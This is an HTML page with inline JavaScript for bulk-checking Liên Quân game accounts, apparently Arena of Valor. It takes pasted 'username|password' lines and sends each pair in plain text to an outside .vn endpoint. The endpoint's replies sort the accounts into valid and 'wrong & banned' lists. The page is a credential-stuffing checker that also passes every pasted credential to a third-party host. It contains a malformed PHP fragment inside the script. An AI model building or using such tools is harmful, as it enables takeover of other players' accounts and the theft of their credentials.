<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      @import url("https://fonts.googleapis.com/css2?family=Almarai&display=swap");
      body {
        margin: 30px 0 0;
        background: #91d1d3;
        font-family: "Almarai", serif;
      }

      .paper {
        position: relative;
        width: 90%;
        max-width: 800px;
        min-width: 400px;
        height: 260px;
        margin: 0 auto;
        background: #fafafa;
        border-radius: 10px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);

        margin-top: 50px;
      }

      .paper textarea {
        width: 100%;
        max-width: 100%;
        height: 100%;
        max-height: 100%;
        line-height: 30px;
        padding: 0 10px;
        border: 0;
        outline: 0;
        background: transparent;
        font-family: "Almarai", cursive;
        font-weight: bold;
        font-size: 15px;
        box-sizing: border-box;
        z-index: 1;
      }

      .paper.success textarea {
        color: green;
      }
      .paper.error textarea {
        color: red;
      }
      .btn-16 {
        border: none;
        color: #000;
        margin: 0 auto;
        width: 100%;
      }
      .btn-16:after {
        position: absolute;
        content: "";
        width: 0;
        height: 100%;
        top: 0;
        left: 0;
        direction: rtl;
        z-index: -1;
        box-shadow: -7px -7px 20px 0px #fff9, -4px -4px 5px 0px #fff9,
          7px 7px 20px 0px #0002, 4px 4px 5px 0px #0001;
        transition: all 0.3s ease;
      }
      .btn-16:hover {
        color: #000;
      }
      .btn-16:hover:after {
        left: auto;
        right: 0;
        width: 100%;
      }
      .btn-16:active {
        top: 2px;
      }
      button {
        margin: 20px;
        font-weight: bold;
        font-size: 18px;
      }
      .custom-btn {
        width: 250px;
        height: 50px;
        margin: 0 auto;
        color: green;
        border-radius: 5px;
        padding: 10px 25px;
        font-family: "Lato", sans-serif;
        font-weight: 500;
        background: transparent;
        cursor: pointer;
        transition: all 0.3s ease;
        position: relative;
        display: inline-block;
        box-shadow: inset 2px 2px 2px 0px rgba(255, 255, 255, 0.5),
          7px 7px 20px 0px rgba(0, 0, 0, 0.1),
          4px 4px 5px 0px rgba(0, 0, 0, 0.1);
        outline: none;
      }
      h2 {
        position: absolute;
        left: 50%;
        transform: translateX(-50%);
        /*top: -20%;*/
        width: 100%;
      }
    </style>
    <title>CHECK THÔNG TIN LIÊN QUÂN</title>
  </head>
  <body>
    <div id="input" style="text-align: center"></div>
    <div class="paper input">
      <h2 style="text-align: center">
        Tổng đầu vào: <span id="count--input">0</span> acc
      </h2>
      <textarea id="input" autofocus></textarea>
    </div>
    <div style="text-align: center; margin-top: 25px">
      <button id="run-tool" class="custom-btn btn-16">Start</button>
    </div>
    <h2 style="text-align: center">
      Tổng acc đúng: <span id="count--success">0</span> acc
    </h2>
    <div class="paper success">
      <textarea id="dung" autofocus></textarea>
    </div>
    <div class="paper error">
      <h2 style="text-align: center">
        Tổng acc sai & ban: <span id="count--error">0</span> acc
      </h2>
      <textarea id="sai" autofocus></textarea>
    </div>
    <script>
      const countSuccess = () => {};
      const countError = () => {};
      const logicLogin = async (input, token) => {
        const [username, password] = input.split("|");
        const api = await fetch(
          `https://xn--webcatui-qg1d.vn/gas.php?u=${username}&p=${password}`
        );

        const res = await api.json();
        if (!res.status) {
          document.querySelector("textarea#sai").value += input + "\n";
        } else {
          document.querySelector("textarea#dung").value += res.msg + "\n";
        }
      };
      const btn = document.querySelector("button#run-tool");
      btn.addEventListener("click", async () => {
        const token = null;
        const accs = document.querySelector("textarea#input").value.split("\n");
        document.querySelector("span#count--input").textContent = accs.length;

        for (let i = 0; i < accs.length; i++) {
          await logicLogin(accs[i], token);
          if (i === accs.length - 1) {
            <?php
                    echo 'alert("<script>document.querySelector("textarea#sai").value</script>")';
                ?>
          }
        }
      });
    </script>
  </body>
</html>
